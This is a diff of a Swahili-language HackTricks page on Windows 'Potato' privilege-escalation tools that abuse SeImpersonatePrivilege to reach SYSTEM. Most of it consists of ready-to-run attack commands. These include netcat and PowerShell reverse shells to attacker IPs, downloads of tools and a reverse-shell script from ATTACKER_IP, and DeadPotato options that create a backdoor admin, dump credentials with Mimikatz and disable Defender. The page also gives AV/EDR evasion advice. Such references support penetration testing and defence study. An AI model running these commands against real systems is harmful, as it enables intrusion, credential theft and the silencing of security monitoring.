@@ -3,12 +3,12 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!WARNING]
-> **JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 build 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** zinaweza kutumika kupata ruhusa sawa na kupata upatikanaji wa ngazi ya `NT AUTHORITY\SYSTEM`. Chapisho hili la blogu (https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) linaelezea kwa undani zana ya `PrintSpoofer`, ambayo inaweza kutumika kuudhi impersonation privileges kwenye mashine za Windows 10 na Server 2019 ambapo JuicyPotato haifanyi kazi tena.
+> **JuicyPotato haifanyi kazi** kwenye Windows Server 2019 na Windows 10 build 1809 na baadaye. Hata hivyo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** zinaweza kutumika ili **kupata ruhusa sawa na kupata ngazi ya `NT AUTHORITY\SYSTEM`**. Chapisho hili la blogu (https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) linachambua kwa undani chombo cha `PrintSpoofer`, ambacho kinaweza kutumika kunyanyasa ruhusa za impersonation kwenye mashine za Windows 10 na Server 2019 ambapo JuicyPotato haitumiki tena.
 
 > [!TIP]
-> Chaguo la kisasa linalotunzwa mara kwa mara mwaka 2024–2025 ni SigmaPotato (a fork of GodPotato) ambalo linaongeza matumizi ya in-memory/.NET reflection na msaada uliopanuliwa wa OS. Angalia matumizi ya haraka hapa chini na repo katika References.
+> Mbadala wa kisasa unaotunzwa mara kwa mara mwaka 2024–2025 ni SigmaPotato (tawi la GodPotato) ambalo linaongeza matumizi ya in-memory/.NET reflection na msaada ulioongezwa wa OS. Tazama matumizi ya haraka hapa chini na repo katika References.
 
-Related pages for background and manual techniques:
+Kurasa zinazohusiana kwa maelezo ya msingi na mbinu za mikono:
 
 {{#ref}}
 seimpersonate-from-high-to-system.md
@@ -24,23 +24,23 @@ privilege-escalation-abusing-tokens.md
 
 ## Mahitaji na matatizo ya kawaida
 
-Mbinu zote zifuatazo zinategemea kutumia vibaya impersonation-capable privileged service kutoka muktadha unaoshikilia moja ya ruhusa hizi:
+Tekniki zote zifuatazo zinategemea kunyanyasa huduma yenye uwezo wa impersonation na ruhusa kutoka muktadha unaoshikilia mojawapo ya ruhusa hizi:
 
-- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
-- High integrity haidiwi ikiwa token tayari ina SeImpersonatePrivilege (kawaida kwa akaunti nyingi za huduma kama IIS AppPool, MSSQL, n.k.)
+- SeImpersonatePrivilege (mara nyingi) au SeAssignPrimaryTokenPrivilege
+- Uadilifu wa juu hauhitajiki ikiwa token tayari ina SeImpersonatePrivilege (kawaida kwa akaunti nyingi za huduma kama IIS AppPool, MSSQL, n.k.)
 
 Angalia ruhusa kwa haraka:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
-Operational notes:
+Vidokezo vya uendeshaji:
 
-- Ikiwa shell yako inaendesha chini ya tokeni iliyorodheshwa bila SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), rudisha ruhusa za kawaida za akaunti kwa kutumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`
-- PrintSpoofer inahitaji huduma ya Print Spooler iendeshwe na iwe inapatikana kupitia local RPC endpoint (spoolss). Katika hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
-- RoguePotato inahitaji OXID resolver inayoweza kufikiwa kwenye TCP/135. Ikiwa egress imezuiwa, tumia redirector/port-forwarder (see example below). Older builds needed the -f flag.
-- EfsPotato/SharpEfsPotato hutumia MS-EFSR; ikiwa pipe moja imezuiwa, jaribu alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
-- Error 0x6d3 during RpcBindingSetAuthInfo kwa kawaida inaonyesha unknown/unsupported RPC authentication service; jaribu pipe/transport tofauti au hakikisha target service inaendeshwa.
-- “Kitchen-sink” forks such as DeadPotato zinajumuisha moduli za ziada za payload (Mimikatz/SharpHound/Defender off) ambazo huandika kwenye diski; tarajia utambuzi wa EDR kuwa mkubwa zaidi compared to the slim originals.
+- Ikiwa shell yako inaendesha chini ya restricted token isiyokuwa na SeImpersonatePrivilege (ya kawaida kwa Local Service/Network Service katika muktadha fulani), rejesha vibali vya chaguo-msingi vya akaunti ukitumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`
+- PrintSpoofer inahitaji huduma ya Print Spooler iendeshwe na ipatike kupitia endpoint ya RPC ya eneo-kazi (spoolss). Katika mazingira yaliyohifadhiwa ambapo Spooler imezimwa baada ya PrintNightmare, tumia RoguePotato/GodPotato/DCOMPotato/EfsPotato.
+- RoguePotato inahitaji OXID resolver inayofikika kwa TCP/135. Ikiwa egress imezuiliwa, tumia redirector/port-forwarder (tazama mfano hapa chini). Builds za zamani zilihitaji -f flag.
+- EfsPotato/SharpEfsPotato hutumia MS-EFSR; ikiwa pipe moja imezuiliwa, jaribu pipes mbadala (lsarpc, efsrpc, samr, lsass, netlogon).
+- Kosa 0x6d3 wakati wa RpcBindingSetAuthInfo kawaida inaonyesha huduma ya uthibitishaji ya RPC isiyojulikana/isipokelewe; jaribu pipe/transport tofauti au hakikisha huduma ya lengo inaendesha.
+- Forks za "kitchen-sink" kama DeadPotato zinabundled moduli za ziada za payload (Mimikatz/SharpHound/Defender off) ambazo zinaandika diski; tarajia uonekano mkubwa zaidi wa EDR ikilinganishwa na asili nyembamba.
 
 ## Demo ya Haraka
 
@@ -60,8 +60,8 @@ NULL
 
 ```
 Vidokezo:
-- Unaweza kutumia -i kuanzisha mchakato mwingiliano kwenye console ya sasa, au -c kuendesha one-liner.
-- Inahitaji huduma ya Spooler. Ikiwa imezimwa, itashindwa.
+- Unaweza kutumia -i kuanzisha mchakato wa mwingiliano kwenye console ya sasa, au -c kutekeleza one-liner.
+- Inahitaji huduma ya Spooler. Ikiwa imezimwa, hii itashindwa.
 
 ### RoguePotato
 ```bash
@@ -69,7 +69,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-Ikiwa outbound 135 imezuiwa, pivot the OXID resolver kupitia socat kwenye redirector yako:
+Ikiwa outbound 135 imezuiwa, pivot OXID resolver kupitia socat kwenye redirector yako:
 ```bash
 # On attacker redirector (must listen on TCP/135 and forward to victim:9999)
 socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
@@ -79,22 +79,22 @@ RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
 ```
 ### PrintNotifyPotato
 
-PrintNotifyPotato ni primitive mpya ya matumizi mabaya ya COM iliyotolewa mwishoni mwa 2022 inayolenga huduma ya **PrintNotify** badala ya Spooler/BITS. Binary inaunda PrintNotify COM server, inaingiza `IUnknown` bandia, kisha inasababisha callback yenye mamlaka kupitia `CreatePointerMoniker`. Wakati huduma ya PrintNotify (inayoendesha kama **SYSTEM**) inarudi kuungana, mchakato unakopia token iliyorejeshwa na kuzindua payload iliyotolewa kwa ruhusa kamili.
+PrintNotifyPotato ni primitive mpya ya matumizi mabaya ya COM iliyotolewa mwishoni mwa 2022 inayolenga huduma ya **PrintNotify** badala ya Spooler/BITS. The binary instantiates the PrintNotify COM server, swaps in a fake `IUnknown`, then triggers a privileged callback through `CreatePointerMoniker`. When the PrintNotify service (running as **SYSTEM**) connects back, the process duplicates the returned token and spawns the supplied payload with full privileges.
 
 Key operational notes:
 
-* Inafanya kazi kwenye Windows 10/11 na Windows Server 2012–2022 mradi tu Print Workflow/PrintNotify service imewekwa (ipo hata pale legacy Spooler ikiwa imezimwa baada ya PrintNightmare).
-* Inahitaji muktadha unaoitisha kuwa na **SeImpersonatePrivilege** (kawaida kwa IIS APPPOOL, MSSQL, na akaunti za huduma za scheduled-task).
-* Inakubali amri ya moja kwa moja au mode ya mwingiliano ili uweze kubaki ndani ya console ya awali. Mfano:
+* Inafanya kazi kwenye Windows 10/11 na Windows Server 2012–2022 mradi tu Print Workflow/PrintNotify service imewekwa (imo hata wakati legacy Spooler imezimwa baada ya PrintNightmare).
+* Inahitaji calling context kushikilia **SeImpersonatePrivilege** (kawaida kwa IIS APPPOOL, MSSQL, na scheduled-task service accounts).
+* Inakubali amri ya moja kwa moja au interactive mode ili ukae ndani ya console ya asili. Mfano:
 
 ```cmd
 PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
 PrintNotifyPotato.exe whoami
 ```
 
-* Kwa sababu inategemea COM tu, hakuna wasikilizi wa named-pipe au redirectors za nje zinazohitajika, ikifanya iwe mbadala rahisi kwenye mashine ambapo Defender anazuia RoguePotato’s RPC binding.
+* Kwa sababu ni COM-based tu, hakuna named-pipe listeners au external redirectors yanahitajika, hivyo inaweza kutumika badala kwa urahisi kwenye hosts ambapo Defender inazuia RoguePotato’s RPC binding.
 
-Operators kama Ink Dragon hutumia PrintNotifyPotato mara tu baada ya kupata ViewState RCE kwenye SharePoint ili kuhamia kutoka kwa mhudumu `w3wp.exe` kwenda SYSTEM kabla ya kusakinisha ShadowPad.
+Operators kama Ink Dragon huita PrintNotifyPotato mara moja baada ya kupata ViewState RCE kwenye SharePoint ili kuhamia kutoka `w3wp.exe` worker hadi SYSTEM kabla ya kusakinisha ShadowPad.
 
 ### SharpEfsPotato
 ```bash
@@ -132,7 +132,7 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 
 nt authority\system
 ```
-Kidokezo: Kama pipe moja itashindwa au EDR ikizuie, jaribu pipe nyingine zinazoungwa mkono:
+Kidokezo: Ikiwa pipe moja inashindwa au EDR inazuia, jaribu pipes nyingine zinazoungwa mkono:
 ```text
 EfsPotato <cmd> [pipe]
 pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
@@ -144,13 +144,21 @@ pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
 > GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
 Vidokezo:
-- Inafanya kazi kwenye Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege ipo.
+- Inafanya kazi kwa Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege inapatikana.
+- Pata binary inayolingana na runtime iliyosakinishwa (kwa mfano, `GodPotato-NET4.exe` on modern Server 2022).
+- Ikiwa initial execution primitive yako ni webshell/UI yenye timeouts fupi, panga payload kama script na muulize GodPotato kuiendesha badala ya amri ndefu ya inline.
 
+Mfano mfupi wa staging kutoka katika IIS webroot inayoweza kuandikwa:
+```powershell
+iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
+iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
+./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
+```
 ### DCOMPotato
 
 ![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
-DCOMPotato inatoa matoleo mawili yanayolenga service DCOM objects ambazo kwa default zinatumia RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa na endesha amri yako:
+DCOMPotato hutoa toleo mbili zinazolenga service DCOM objects ambazo kwa chaguo-msingi zinatumia RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa kisha endesha amri yako:
 ```cmd
 # PrinterNotify variant
 PrinterNotifyPotato.exe "cmd /c whoami"
@@ -158,7 +166,7 @@ PrinterNotifyPotato.exe "cmd /c whoami"
 # McpManagementService variant (Server 2022 also)
 McpManagementPotato.exe "cmd /c whoami"
 ```
-### SigmaPotato (tawi la GodPotato lililoboreshwa)
+### SigmaPotato (fork ya GodPotato iliyosasishwa)
 
 SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kupitia .NET reflection na msaidizi wa PowerShell reverse shell.
 ```powershell
@@ -169,25 +177,25 @@ SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kupitia .NET
 # Or ask it to spawn a PS reverse shell
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
-Manufaa ya ziada katika matoleo ya 2024–2025 (v1.2.x):
-- Bendera ya reverse shell iliyojengewa ndani `--revshell` na kuondolewa kwa kikomo cha 1024-char cha PowerShell ili uweze kutuma payloads ndefu zinazopitisha AMSI kwa mara moja.
-- Sintaksia rafiki kwa Reflection (`[SigmaPotato]::Main()`), pamoja na hila ya msingi ya kuepuka AV kupitia `VirtualAllocExNuma()` ili kupotosha heuristics rahisi.
-- Tofauti `SigmaPotatoCore.exe` iliyotengenezwa kwa .NET 2.0 kwa mazingira ya PowerShell Core.
+Additional perks in 2024–2025 builds (v1.2.x):
+- Bendera ya reverse shell iliyojengwa ndani `--revshell` na kuondolewa kwa kikomo cha 1024-char cha PowerShell ili uweze kutuma payloads ndefu zinazopitia AMSI kwa mara moja.
+- Sintaksia inayofaa kwa reflection (`[SigmaPotato]::Main()`), pamoja na mbinu ya msingi ya kuepuka AV kwa kutumia `VirtualAllocExNuma()` ili kuyapotosha heuristics rahisi.
+- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.
 
-### DeadPotato (urekebishaji wa GodPotato wa 2024 wenye moduli)
+### DeadPotato (urekebishaji wa GodPotato 2024 na moduli)
 
-DeadPotato inahifadhi mnyororo wa impersonation wa GodPotato OXID/DCOM lakini inaingiza wasaidizi wa post-exploitation ili operatori waweze kuchukua SYSTEM mara moja na kufanya persistence/collection bila zana za ziada.
+DeadPotato inahifadhi mnyororo wa OXID/DCOM impersonation wa GodPotato lakini inaingiza wasaidizi wa post-exploitation ili waendeshaji waweze kunyakua SYSTEM mara moja na kufanya persistence/collection bila zana za ziada.
 
-Moduli za kawaida (vyote vinahitaji SeImpersonatePrivilege):
+Common modules (zote zinahitaji SeImpersonatePrivilege):
 
-- `-cmd "<cmd>"` — spawn amri yoyote kama SYSTEM.
-- `-rev <ip:port>` — quick reverse shell.
-- `-newadmin user:pass` — unda admin wa ndani kwa persistence.
-- `-mimi sam|lsa|all` — drop and run Mimikatz to dump credentials (huandika kwenye diski; inayoonekana sana).
-- `-sharphound` — run SharpHound collection kama SYSTEM.
-- `-defender off` — flip Defender real-time protection (inayoonekana sana).
+- `-cmd "<cmd>"` — anzisha amri yoyote kama SYSTEM.
+- `-rev <ip:port>` — reverse shell ya haraka.
+- `-newadmin user:pass` — tengeneza admin wa ndani kwa persistence.
+- `-mimi sam|lsa|all` — angusha na endesha Mimikatz ili kudump credentials (inaandika kwenye disk, inasababisha kelele nyingi).
+- `-sharphound` — endesha SharpHound collection kama SYSTEM.
+- `-defender off` — zima Defender real-time protection (inasababisha kelele nyingi).
 
-Mifano ya one-liners:
+Example one-liners:
 ```cmd
 # Blind reverse shell
 DeadPotato.exe -rev 10.10.14.7:4444
@@ -198,9 +206,9 @@ DeadPotato.exe -newadmin pwned:P@ssw0rd!
 # Run SharpHound immediately after priv-esc
 DeadPotato.exe -sharphound
 ```
-Kwa kuwa inakuja na binaries za ziada, tarajia alama nyingi zaidi za AV/EDR; tumia GodPotato/SigmaPotato nyembamba wakati stealth inapotokea kuwa muhimu.
+Kwa sababu inasafirisha binaries za ziada, tarajia alama nyingi zaidi za AV/EDR; tumia GodPotato/SigmaPotato nyembamba wakati ujificha (stealth) unahitajika.
 
-## Marejeo
+## Marejeleo
 
 - [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
 - [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
@@ -211,10 +219,11 @@ Kwa kuwa inakuja na binaries za ziada, tarajia alama nyingi zaidi za AV/EDR; tum
 - [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
 - [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
 - [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
-- [FullPowers – Rejesha ruhusa za token za chaguo-msingi kwa service accounts](https://github.com/itm4n/FullPowers)
-- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato hadi SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
+- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
 - [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
-- [Check Point Research – Inside Ink Dragon: Kufichua Relay Network na jinsi inavyofanya kazi ndani ya operesheni ya shambulio yenye stealth](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 - [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)
 
 {{#include ../../banners/hacktricks-training.md}}
